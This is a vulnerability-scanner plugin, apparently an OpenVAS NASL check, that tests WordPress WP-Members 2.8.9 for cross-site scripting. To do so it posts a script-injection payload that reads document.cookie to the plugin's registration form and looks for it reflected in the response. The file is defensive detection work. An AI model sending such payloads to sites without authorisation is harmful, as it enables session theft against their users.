CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804059" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2014-01-09 17:04:49 +0530 (Thu, 09 Jan 2014)" );
	script_name( "WordPress WP-Members Multiple Cross Site Scripting Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with WordPress WP-Members Plugin and is prone to
multiple cross site scripting vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "solution", value: "Update to version WordPress WP-Members Plugin 2.8.10 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "insight", value: "Flaws are due to input sanitation errors in multiple GET and POST parameter." );
	script_tag( name: "affected", value: "WordPress WP-Members Plugin version 2.8.9, Other versions may also be affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2014010044" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2014/Jan/29" );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/wp-members/changelog" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-login.php?action=register";
postData = "user_login=&user_email=&first_name=%27\"--></style></script>" + "<script>alert(document.cookie)</script>&last_name=&addr1=&addr2=&city" + "=&thestate=&zip=&country=&phone1=&redirect_to=&wp-submit=Register";
sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", get_host_name(), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
if(IsMatchRegexp( rcvRes, "HTTP/1\\.. 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" ) && ContainsString( rcvRes, ">Register" )){
	security_message( http_port );
	exit( 0 );
}

